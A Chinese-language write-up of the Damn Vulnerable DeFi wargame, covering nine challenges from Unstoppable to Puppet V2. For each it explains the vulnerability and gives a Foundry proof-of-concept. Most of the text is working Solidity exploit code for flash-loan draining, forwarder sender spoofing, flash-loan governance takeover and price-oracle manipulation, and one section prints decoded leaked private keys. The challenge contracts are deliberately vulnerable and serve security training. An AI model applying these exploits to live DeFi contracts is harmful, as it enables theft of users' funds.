## Damn Vulnerable DeFi Writeup [SunSec]


### Unstoppable

[題目](https://www.damnvulnerabledefi.xyz/challenges/unstoppable/): 
有一個代幣化的金庫，存入了100萬個DVT代幣。該金庫提供免費的閃電貸款，直到寬限期結束。為了在完全無需許可前捕捉任何錯誤，開發者決定在測試網中進行實時測試。還有一個監控合約，用來檢查閃電貸款功能的運行狀況。從餘額為10個DVT代幣開始，展示如何使金庫停止運行。必須讓它停止提供閃電貸款。

過關條件:
- 讓 flashLoan 功能失效

解題:
只要 transfer token 給這個合約就可以讓 totalSupply != balanceBefore 讓閃電貸款失效。

```
 if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); 
```

[POC:](./damn-vulnerable-defi/test/unstoppable/Unstoppable.t.sol) 
```
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 123);   
    }
```



### Naive Receiver

[題目](https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/): 
有一個資金池，餘額為1000 WETH，並提供閃電貸款。它收取固定費用為1 WETH。該資金池通過整合無需許可的轉發合約，支持元交易。一名使用者部署了一個餘額為10 WETH的範例合約。看起來它可以執行WETH的閃電貸款。所有資金都面臨風險！將使用者和資金池中的所有WETH救出，並將其存入指定的recovery賬戶。

過關條件:
- 必須執行兩次或更少的交易。確保 vm.getNonce(player) 小於等於2
- 確保 weth.balanceOf(address(receiver)) 為 0
- 確保 weth.balanceOf(address(pool)) 為 0
- 確保 weth.balanceOf(recovery) 等於 WETH_IN_POOL + WETH_IN_RECEIVER = 1010 ETH。

解題:
- NaiveReceiverPool 繼承 Multicall, IERC3156FlashLender 
[ERC-3156](https://eips.ethereum.org/EIPS/eip-3156): 閃電貸模組和允許閃電貸的 {ERC20} 擴充.
- FlashLoanReceiver 題目初始有10ETH,每次接收的 Flashloan 會支付1ETH手續費給 Pool. 但問題在於 onFlashLoan 沒有檢查發起 Flashloan是不是授權的來源. 所以我們只要發送10次 Flashloan 然後 amount 帶入0. 就可以把FlashLoanReceiver的10ETH轉走. 但是題目要求 Nonce 要小於2. 在前面有提到 NaiveReceiverPool 繼承 Multicall.  所以我們可以透過Multicall執行一次交易操作10次Flashloan就可以滿足 Nonce 小於2.
- 再來要想辦法把 NaiveReceiverPool 初始的1000ETH轉走. 從合約中可以看到唯一可以把資產轉走的function 是 withdraw. 可以發現到 _msgSender 需滿足 msg.sender == trustedForwarder && msg.data.length >= 20. 就可以返回最後20bytes 地址. 這邊是可以操控的.
- 再來是滿足 msg.sender == trustedForwarder. 這裡就要透過 forwarder 執行 meta-transaction.  

```
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
            //bytes20：將 msg.data 中最後 20 個字節轉換為 address 類型
        } else {
            return super._msgSender();
        }
    }

```
[POC](./damn-vulnerable-defi/test/naive-receiver/NaiveReceiver.t.sol) : 
```
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            callData,
            1 days
        );
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```

### Truster

[題目](https://www.damnvulnerabledefi.xyz/challenges/truster/): 
越來越多的借貸池提供閃電貸款。在這個情況下，一個新的池子已經啟動，提供免費的 DVT 代幣閃電貸款。該池子持有 100 萬個 DVT 代幣。而你什麼都沒有。要通過這個挑戰，你需要在一筆交易中拯救池子中的所有資金，並將這些資金存入指定的恢復賬戶。

過關條件:
- 只能執行1筆交易
- 救援資金發送至 recovery 帳戶

解題:
- 在 floashLoan 中可以看到 target.functionCall(data); 可以執行任意calldata且target的地址可控. 可直接執行任意指令.

[POC](./damn-vulnerable-defi/test/truster/Truster.t.sol) : 
```
    function test_truster() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(pool), address(token),address(recovery));
    }
    
 contract Exploit {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address recoveryAddress) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, address(recoveryAddress), TOKENS_IN_POOL);
    }
}
```

### Side Entrance

[題目](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/): 一個出乎意料的簡單池子允許任何人存入ETH，並隨時提取。該池子已經有1000 ETH的餘額，並提供免費的閃電貸款來推廣他們的系統。你開始時有1 ETH的餘額。通過將池子裡的所有ETH救出並存入指定的 Recovery 錢包來完成挑戰。

過關條件:
- 池子的餘額必須為0.
- 指定的 Recovery 錢包中的餘額必須等於池子中原本的ETH數量（即 ETHER_IN_POOL）.
解題:
- flashLoan 採用非標準用法, 判斷有沒有repay只是看池子的餘額 if (address(this).balance < balanceBefore). 
- 所以只要透過 flashLoan借款出來, 再透過deposit存回去. 就代表repay了. 然後你在合約同時有存款證明, 可執行 withdraw 就可以把$$轉出去了.

[POC](./damn-vulnerable-defi/test/SideEntrance/SideEntrance.t.sol) : 
```
    function test_sideEntrance() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(address(pool), recovery, ETHER_IN_POOL);
        exploiter.attack();
    }
contract Exploit{
    SideEntranceLenderPool public pool;
    address public recovery;
    uint public exploitAmount;
    constructor(address _pool, address _recovery, uint _amount){  
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }
    function attack() external returns(bool){
        pool.flashLoan(exploitAmount);
        pool.withdraw();
        payable(recovery).transfer(exploitAmount);
    }
    function execute() external payable{
        pool.deposit{value:msg.value}();
    }
    receive() external payable{}
}

```
### The Rewarder
[題目](https://www.damnvulnerabledefi.xyz/challenges/the-rewarder/): 一個合約正在分發Damn Valuable Tokens和WETH作為獎勵。要領取獎勵，用戶必須證明自己在選定的受益者名單中。不過不用擔心燃料費，這個合約已經過優化，允許在同一筆交易中領取多種代幣。Alice已經領取了她的獎勵。你也可以領取你的獎勵！但你發現這個合約中存在一個關鍵漏洞。儘可能多地從這個分發者手中拯救資金，將所有回收的資產轉移到指定的 Recovery 錢包中。

過關條件:
- 分發者合約中的剩餘DVT數量必須少於1e16（也就是0.01 DVT），僅允許留下極少量的「Dust」。
- 分發者合約中的剩餘WETH數量必須少於1e15（也就是0.001 WETH），僅允許留下極少量的「Dust」。
- 指定Recovery 錢包中的DVT數量必須等於總分發DVT數量（TOTAL_DVT_DISTRIBUTION_AMOUNT）減去Alice已經領取的DVT數量（ALICE_DVT_CLAIM_AMOUNT）以及分發者合約中剩餘的DVT數量。
- 指定Recovery 錢包中的WETH數量必須等於總分發WETH數量（TOTAL_WETH_DISTRIBUTION_AMOUNT）減去Alice已經領取的WETH數量（ALICE_WETH_CLAIM_AMOUNT）以及分發者合約中剩餘的WETH數量。

解題:
- 基於 Merkle proofs 和 bitmaps 代幣分配合約
- REF: [Bitmaps & Merkle Proofs](https://x.com/DegenShaker/status/1825835855140868370) | [Bitmap结构在ENSToken里的应用](https://mirror.xyz/franx.eth/0PTXWm1ynYxeF11S_xlXzmQqeICHQeI4tz3Uwz9aWuk)
- 合約中可以發現在 claimRewards 中, 更新用戶是不是有領過reward是透過 _setClaimed().
- 因為 claimRewards支援array, 可以一個transaction執行多次claim. 並在最後一個claim才更新用戶claimreward紀錄.
- player 的地址, index為188
```
            // for the last claim
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
```
[POC](./damn-vulnerable-defi/test/the-rewarder/TheRewarder.t.sol) : 
```
   function test_theRewarder() public checkSolvedByPlayer {
        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /
            PLAYER_DVT_CLAIM_AMOUNT;
        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT /
            PLAYER_WETH_CLAIM_AMOUNT;
        uint totalTxCount = dvtTxCount + wethTxCount;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        console.log(totalTxCount);
        Claim[] memory claims = new Claim[](totalTxCount);

        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_DVT_CLAIM_AMOUNT,
                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(dvtLeaves, 188) //player at index 188
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_WETH_CLAIM_AMOUNT,
                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(wethLeaves, 188)  //player at index 188
                });
            }
        }
        //multiple claims
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
    
```

### Selfie

[題目](https://www.damnvulnerabledefi.xyz/challenges/selfie/): 一個新的貸款池已經上線！現在它提供DVT代幣的閃電貸款服務。這個池子還包括一個精巧的治理機制來控制它。這能出什麼問題呢，對吧？你開始時沒有任何DVT代幣餘額，而這個池子中有150萬的資金面臨風險。將池子中的所有資金救出並存入指定的回收賬戶，完成這項挑戰。

過關條件:
- 池子的DVT餘額必須為0.
- 指定的 Recovery 錢包中的餘額必須等於池子中原本的DVT數量（即 TOKENS_IN_POOL）.

解題:
- SelfiePool 合約中有一個 function emergencyExit() 可以把合約中所有餘額轉移. 但需要滿足 onlyGovernance 權限.
- 跟進 SimpleGovernance 合約可以發現可以透過 queueAction 發起一個提案, 且data可以控制. 那就可以透過這個方式去執行 emergencyExit().
- 要執行 queueAction 要通過 _hasEnoughVotes 檢查, DamnValuableVotes 繼承 ERC20Votes, 所以借貸到的DVT需要delete受投票權給自己, 需要持有總發行量的一半投票權才能發起提案.
- 解題流程: Flashloan -> delegate ->發起提案 queueAction -> repay -> executeAction

[POC](./damn-vulnerable-defi/test/selfie/selfie.t.sol) : 
```
    function test_selfie() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(
            address(pool),
            address(governance),
            address(token)
        );
        exploiter.exploitSetup(address(recovery));
        vm.warp(block.timestamp + 2 days);
        exploiter.exploitCloseup();
    }

contract Exploit is IERC3156FlashBorrower{
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableToken;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    constructor(
        address _selfiePool, 
        address _simpleGovernance,
        address _token
    ){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        damnValuableToken.delegate(address(this));
        uint _actionId = simpleGovernance.queueAction(
            address(selfiePool),
            0,
            data
        );
        actionId = _actionId;
        IERC20(token).approve(address(selfiePool), amount+fee);
        return CALLBACK_SUCCESS;
    }

    function exploitSetup(address recovery) external returns(bool){
        uint amountRequired = 1_500_000e18;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amountRequired, data);
    }
    function exploitCloseup() external returns(bool){
        bytes memory resultData = simpleGovernance.executeAction(actionId);
    }
}
```

### Compromised

[題目](https://www.damnvulnerabledefi.xyz/challenges/compromised/): 在瀏覽一個最受歡迎的DeFi項目之一的網絡服務時，你從服務器那裡得到了一個奇怪的響應。以下是其中的一段：
```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```
一個相關的鏈上交易所正在出售名為“DVNFT”的（價格荒誕地高）的收藏品，目前每個價格為999 ETH。這個價格是由一個基於三個可信報告者的鏈上預言機獲取的，這三個報告者分別是：0x188...088、0xA41...9D8 和 0xab3...a40。
你開始時賬戶餘額僅為0.1 ETH，通過將交易所中可用的所有ETH救出來來完成挑戰。然後將資金存入指定的回收賬戶中。

過關條件:
- exchange 合約地址中的ETH餘額必須為0.
- recovery 地址中的ETH餘額必須等於exchange的初始ETH餘額
- player的NFT餘額必須為0
- 預言機中的DVNFT價格必須保持不變，仍然等於初始NFT價格（INITIAL_NFT_PRICE），確保挑戰過程中沒有操縱價格

解題:
- leaked_infomation decode出來後是兩個錢包私鑰, 這兩個錢包可以設定 oracle price
```
import base64

def hex_to_ascii(hex_str):
    ascii_str = ''
    for i in range(0, len(hex_str), 2):
        ascii_str += chr(int(hex_str[i:i+2], 16))
    return ascii_str

def decode_base64(base64_str):
    # Decode Base64 to ASCII
    return base64.b64decode(base64_str).decode('utf-8')

leaked_information = [
    '4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30',
    '4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35',
]

from eth_account import Account

for leak in leaked_information:
    hex_str = ''.join(leak.split())
    ascii_str = hex_to_ascii(hex_str)
    decoded_str = decode_base64(ascii_str)
    private_key = decoded_str
    print("Private Key:", private_key)
    
    # Create a wallet instance from the private key
    wallet = Account.from_key(private_key)
    
    # Get the public key (address)
    address = wallet.address
    print("Wallet address:", address)

Private Key: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
Wallet address: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
Private Key: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
Wallet address: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8

```
- 操控NFT價格, 低買高賣即可獲得更多ETH

[POC](./damn-vulnerable-defi/test/compromised/Compromised.t.sol) : 
```
    function test_compromised() public checkSolved {
        Exploit exploit = new Exploit{value:address(this).balance}(oracle, exchange, nft, recovery);
        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0],0);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0],0);
        vm.stopPrank();

        exploit.buy();

        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0],999 ether);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0],999 ether);
        vm.stopPrank();
        exploit.sell();
        exploit.recover(999 ether);
    }
    contract Exploit is IERC721Receiver{
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint nftId;
    address recovery;
    constructor(    
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }
    function buy() external payable{
        uint _nftId = exchange.buyOne{value:1}();
        nftId = _nftId;
    }
    function sell() external payable{
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }
    function recover(uint amount) external {
        payable(recovery).transfer(amount);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }
    receive() external payable{
    }
}
```

### Puppet

[題目](https://www.damnvulnerabledefi.xyz/challenges/puppet/): 有一個貸款池，使用者可以在其中借貸Damn Valuable Tokens（DVTs）。要借貸，他們首先需要存入借款額度兩倍的ETH作為抵押品。該池目前有100,000 DVT的流動性。在一個老舊的Uniswap v1交易所中開設了DVT市場，目前有10 ETH和10 DVT的流動性。通過將貸款池中的所有代幣救出來並將它們存入指定的 recovery 錢包來完成挑戰。你開始時有25 ETH和1000 DVT的餘額。

過關條件:
- 確保僅執行一筆交易
- lendingPool 的DVT代幣為0
- 將所有DVT轉到 recovery 錢包

解題:
- 過去很多被駭事件, 使用合約上的餘額來當條件, 這是非常危險的且可被操控. 在PuppetPool中可以看到 _computeOraclePrice 就是使用balance來計算 oracle price.
```
    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
```
- 將自己的所有DVT透過 tokenToEthTransferInput 打到 uniswapV1Exchange 操控price.
- 
[POC](./damn-vulnerable-defi/test/puppet/Puppet.t.sol) : 
```
    function test_puppet() public checkSolvedByPlayer {
        Exploit exploit = new Exploit{value:PLAYER_INITIAL_ETH_BALANCE}(
            token,
            lendingPool,
            uniswapV1Exchange,
            recovery
        );
        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
    }

contract Exploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;
    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery 
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }
    function attack(uint exploitAmount) public {
        uint tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        console.log("before calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
        console.log(token.balanceOf(address(uniswapV1Exchange)));
        console.log("after calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
        lendingPool.borrow{value: 20e18}(
            exploitAmount,
            recovery
        );
    }
    receive() external payable {
    }
}
  before calculateDepositRequired(amount) 200000000000000000000000
  after calculateDepositRequired(amount) 19664329888798200000
```

### Puppet V2

[題目](https://www.damnvulnerabledefi.xyz/challenges/puppet-v2/): 上一個貸款池的開發者似乎吸取了教訓，並發布了新版本。現在，他們使用Uniswap v2交易所作為價格預言機，並搭配推薦的實用庫。這樣應該足夠了吧？你開始時有20 ETH和10000 DVT代幣的餘額。該池子有一百萬DVT代幣的資金面臨風險！將池子中的所有資金救出，並將它們存入指定的recovery 錢包。

過關條件:
- lendingPool 的DVT代幣為0
- 將所有DVT轉到 recovery 錢包

解題:
- 這關oracle改成使用 Uniswap v2, 不過 getReserves 跟取balance是一樣的意思,存在操控的風險

[POC](./damn-vulnerable-defi/test/puppet-v2/PuppetV2.t.sol) : 
```

    // Fetch the price from Uniswap v2 using the official libraries
    function (uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

        return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
    }
```
- 透過 swapExactTokensForTokens 把 player 的 DVT全部換成 WETH, 就可以降低 DVT 價格
```
    function test_puppetV2() public checkSolvedByPlayer {

        token.approve(address(uniswapV2Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        console.log("before alculateDepositOfWETHRequired",lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
        uniswapV2Router.swapExactTokensForETH(token.balanceOf(player), 1 ether, path, player, block.timestamp);

        weth.deposit{value: player.balance}();
   
        weth.approve(address(lendingPool), type(uint256).max);
        uint256 poolBalance = token.balanceOf(address(lendingPool));
        uint256 depositOfWETHRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);
        console.log("after alculateDepositOfWETHRequired",lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,POOL_INITIAL_TOKEN_BALANCE);

    }
  before alculateDepositOfWETHRequired 300000000000000000000000
  after alculateDepositOfWETHRequired 29496494833197321980

```
